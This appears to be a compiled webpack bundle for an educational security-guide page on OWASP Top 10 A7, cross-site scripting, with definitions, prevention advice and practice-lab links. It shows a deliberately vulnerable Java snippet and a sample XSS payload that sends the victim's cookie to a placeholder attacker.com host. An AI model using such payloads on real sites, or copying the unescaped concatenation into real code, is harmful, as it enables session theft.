(window.webpackJsonp=window.webpackJsonp||[]).push([[71],{"1lvi":function(e,t,a){"use strict";a.r(t),a.d(t,"_frontmatter",(function(){return s})),a.d(t,"default",(function(){return l}));a("5hJT"),a("W1QL"),a("K/PF"),a("t91x"),a("75LO"),a("PJhk"),a("mXGw");var n=a("/FXl"),i=a("TjRS");a("aD51");function r(){return(r=Object.assign||function(e){for(var t=1;t<arguments.length;t++){var a=arguments[t];for(var n in a)Object.prototype.hasOwnProperty.call(a,n)&&(e[n]=a[n])}return e}).apply(this,arguments)}var s={};void 0!==s&&s&&s===Object(s)&&Object.isExtensible(s)&&!s.hasOwnProperty("__filemeta")&&Object.defineProperty(s,"__filemeta",{configurable:!0,value:{name:"_frontmatter",filename:"src/owasp_top_10/a7_cross-site_scripting_xss.mdx"}});var c={_frontmatter:s},o=i.a;function l(e){var t=e.components,a=function(e,t){if(null==e)return{};var a,n,i={},r=Object.keys(e);for(n=0;n<r.length;n++)a=r[n],t.indexOf(a)>=0||(i[a]=e[a]);return i}(e,["components"]);return Object(n.b)(o,r({},c,a,{components:t,mdxType:"MDXLayout"}),Object(n.b)("h1",{id:"a7-cross-site-scripting-xss"},"A7 Cross-site scripting (XSS)"),Object(n.b)("h2",{id:"definition"},"Definition"),Object(n.b)("p",null,"XSS flaws occur whenever an application includes untrusted data in a new web page without\nproper validation or escaping, or updates an existing web page with user-supplied data using a\nbrowser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the\nvictim’s browser which can hijack user sessions, deface web sites, or redirect the user to\nmalicious sites."),Object(n.b)("h2",{id:"risk-factor-summary"},"Risk Factor Summary"),Object(n.b)("ul",null,Object(n.b)("li",{parentName:"ul"},"Score: 6.0"),Object(n.b)("li",{parentName:"ul"},"Attack Vectors Exploitability: 3"),Object(n.b)("li",{parentName:"ul"},"Security Weakness Prevalence: 3"),Object(n.b)("li",{parentName:"ul"},"Security Weakness Detectability: 3"),Object(n.b)("li",{parentName:"ul"},"Impact Technical: 2")),Object(n.b)("h2",{id:"context"},"Context"),Object(n.b)("iframe",{width:"100%",height:"450",src:"https://www.youtube.com/embed/IuzU4y-UjLw"}),Object(n.b)("p",null,"Automated tools can detect and\nexploit all three forms of XSS, and\nthere are freely available exploitation\nframeworks."),Object(n.b)("p",null,"XSS is the second most prevalent issue in the\nOWASP Top 10, and is found in around two-thirds of\nall applications."),Object(n.b)("p",null,"Automated tools can find some XSS problems\nautomatically, particularly in mature technologies\nsuch as PHP, J2EE / JSP, and ASP.NET."),Object(n.b)("p",null,"The impact of XSS is moderate for\nreflected and DOM XSS, and severe\nfor stored XSS, with remote code\nexecution on the victim's browser,\nsuch as stealing credentials,\nsessions, or delivering malware to the\nvictim."),Object(n.b)("h2",{id:"is-the-application-vulnerable"},"Is the Application Vulnerable?"),Object(n.b)("p",null,"There are three forms of XSS, usually targeting users' browsers:"),Object(n.b)("ul",null,Object(n.b)("li",{parentName:"ul"},Object(n.b)("p",{parentName:"li"},Object(n.b)("strong",{parentName:"p"},"Reflected XSS:")," The application or API includes unvalidated and\nunescaped user input as part of HTML output. A successful\nattack can allow the attacker to execute arbitrary HTML and\nJavaScript in the victim’s browser. Typically the user will need to\ninteract with some malicious link that points to an attackercontrolled page, such as malicious watering hole websites,\nadvertisements, or similar.")),Object(n.b)("li",{parentName:"ul"},Object(n.b)("p",{parentName:"li"},Object(n.b)("strong",{parentName:"p"},"Stored XSS:")," The application or API stores unsanitized user\ninput that is viewed at a later time by another user or an\nadministrator. Stored XSS is often considered a high or critical\nrisk.")),Object(n.b)("li",{parentName:"ul"},Object(n.b)("p",{parentName:"li"},Object(n.b)("strong",{parentName:"p"},"DOM XSS:")," JavaScript frameworks, single-page applications, and\nAPIs that dynamically include attacker-controllable data to a\npage are vulnerable to DOM XSS. Ideally, the application would\nnot send attacker-controllable data to unsafe JavaScript APIs."))),Object(n.b)("p",null,"Typical XSS attacks include session stealing, account takeover,\nMFA bypass, DOM node replacement or defacement (such as\ntrojan login panels), attacks against the user's browser such as\nmalicious software downloads, key logging, and other client-side\nattacks."),Object(n.b)("h2",{id:"how-to-prevent"},"How to Prevent"),Object(n.b)("p",null,"Preventing XSS requires separation of untrusted data from\nactive browser content. This can be achieved by:"),Object(n.b)("ul",null,Object(n.b)("li",{parentName:"ul"},"Using frameworks that automatically escape XSS by design,\nsuch as the latest Ruby on Rails, React JS. Learn the\nlimitations of each framework's XSS protection and\nappropriately handle the use cases which are not covered."),Object(n.b)("li",{parentName:"ul"},"Escaping untrusted HTTP request data based on the context in\nthe HTML output (body, attribute, JavaScript, CSS, or URL) will\nresolve Reflected and Stored XSS vulnerabilities. The OWASP\n",Object(n.b)("a",r({parentName:"li"},{href:"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"}),"Cheat Sheet 'XSS Prevention'")," has details on the required data\nescaping techniques."),Object(n.b)("li",{parentName:"ul"},"Applying context-sensitive encoding when modifying the\nbrowser document on the client side acts against DOM XSS.\nWhen this cannot be avoided, similar context sensitive\nescaping techniques can be applied to browser APIs as\ndescribed in the ",Object(n.b)("a",r({parentName:"li"},{href:"https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"}),"OWASP Cheat Sheet 'DOM based XSS\nPrevention'"),"."),Object(n.b)("li",{parentName:"ul"},"Enabling a ",Object(n.b)("a",r({parentName:"li"},{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"}),"Content Security Policy (CSP)")," is a defense-in-depth\nmitigating control against XSS. It is effective if no other\nvulnerabilities exist that would allow placing malicious code via\nlocal file includes (e.g. path traversal overwrites or vulnerable\nlibraries from permitted content delivery networks).")),Object(n.b)("h2",{id:"conceptual-attacks"},"Conceptual Attacks"),Object(n.b)("h3",{id:"scenario-1"},"Scenario #1:"),Object(n.b)("p",null,"The application uses untrusted data in the\nconstruction of the following HTML snippet without validation or\nescaping:"),Object(n.b)("pre",null,Object(n.b)("code",r({parentName:"pre"},{}),"(String) page += \"<input name='creditcard' type='TEXT'\nvalue='\" + request.getParameter(\"CC\") + \"'>\";\n")),Object(n.b)("p",null,"The attacker modifies the ‘CC’ parameter in the browser to:"),Object(n.b)("pre",null,Object(n.b)("code",r({parentName:"pre"},{}),"'><script>document.location=\n'http://www.attacker.com/cgi-bin/cookie.cgi?\nfoo='+document.cookie<\/script>'\n")),Object(n.b)("p",null,"This attack causes the victim’s session ID to be sent to the\nattacker’s website, allowing the attacker to hijack the user’s\ncurrent session."),Object(n.b)("p",null,"Note: Attackers can use XSS to defeat any automated CrossSite Request Forgery (CSRF) defense the application might\nemploy."),Object(n.b)("h2",{id:"example-attack-scenarios"},"Example Attack Scenarios"),Object(n.b)("h3",{id:"please-review"},"Please review"),Object(n.b)("ul",null,Object(n.b)("li",{parentName:"ul"},"The ",Object(n.b)("a",r({parentName:"li"},{href:"/attacks_explained/cross-site_scripting_xss"}),"Explained attack: Cross-site scripting (XSS) in this guide"),Object(n.b)("ul",{parentName:"li"},Object(n.b)("li",{parentName:"ul"},Object(n.b)("a",r({parentName:"li"},{href:"/attacks_explained/cross-site_scripting_xss#reflected-xss"}),"Reflected XSS")),Object(n.b)("li",{parentName:"ul"},Object(n.b)("a",r({parentName:"li"},{href:"/attacks_explained/cross-site_scripting_xss#stored-xss"}),"Stored XSS")),Object(n.b)("li",{parentName:"ul"},Object(n.b)("a",r({parentName:"li"},{href:"/attacks_explained/cross-site_scripting_xss#dom-xss"}),"DOM XSS")))),Object(n.b)("li",{parentName:"ul"},"The ",Object(n.b)("a",r({parentName:"li"},{href:"/attacks_explained/cross_site_request_forgery_csrf"}),"Explained attack: Cross Site Request Forgery (CSRF) in this guide")),Object(n.b)("li",{parentName:"ul"},"The ",Object(n.b)("a",r({parentName:"li"},{href:"/attacks_explained/server-side_request_forgery_ssrf"}),"Explained attack: Server-Side Request Forgery (SSRF) in this guide"))),Object(n.b)("h2",{id:"hacking-playground"},"Hacking Playground"),Object(n.b)("ul",null,Object(n.b)("li",{parentName:"ul"},Object(n.b)("a",r({parentName:"li"},{href:"https://nodegoat.herokuapp.com/tutorial/a7"}),"🐐 NodeGoat | A7 Cross-site scripting (XSS)")),Object(n.b)("li",{parentName:"ul"},Object(n.b)("a",r({parentName:"li"},{href:"https://pwning.owasp-juice.shop/part2/xss.html"}),"🧃 Pwning OWASP Juice Shop | A7 Cross-site scripting (XSS)"))),Object(n.b)("h2",{id:"references"},"References"),Object(n.b)("h3",{id:"owasp"},"OWASP"),Object(n.b)("ul",null,Object(n.b)("li",{parentName:"ul"},Object(n.b)("a",r({parentName:"li"},{href:"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"}),"OWASP Cheat Sheet: XSS Prevention")),Object(n.b)("li",{parentName:"ul"},Object(n.b)("a",r({parentName:"li"},{href:"https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"}),"OWASP Cheat Sheet: DOM based XSS Prevention")),Object(n.b)("li",{parentName:"ul"},Object(n.b)("a",r({parentName:"li"},{href:"https://owasp.org/www-community//xss-filter-evasion-cheatsheet"}),"OWASP Cheat Sheet: XSS Filter Evasion"))),Object(n.b)("h3",{id:"cwes"},"CWEs"),Object(n.b)("ul",null,Object(n.b)("li",{parentName:"ul"},Object(n.b)("a",r({parentName:"li"},{href:"https://cwe.mitre.org/data/definitions/79.html"}),"CWE-79: Improper neutralization of user supplied input"))))}void 0!==l&&l&&l===Object(l)&&Object.isExtensible(l)&&!l.hasOwnProperty("__filemeta")&&Object.defineProperty(l,"__filemeta",{configurable:!0,value:{name:"MDXContent",filename:"src/owasp_top_10/a7_cross-site_scripting_xss.mdx"}}),l.isMDXComponent=!0}}]);
//# sourceMappingURL=component---src-owasp-top-10-a-7-cross-site-scripting-xss-mdx-f7b4cb4ff341e289de11.js.map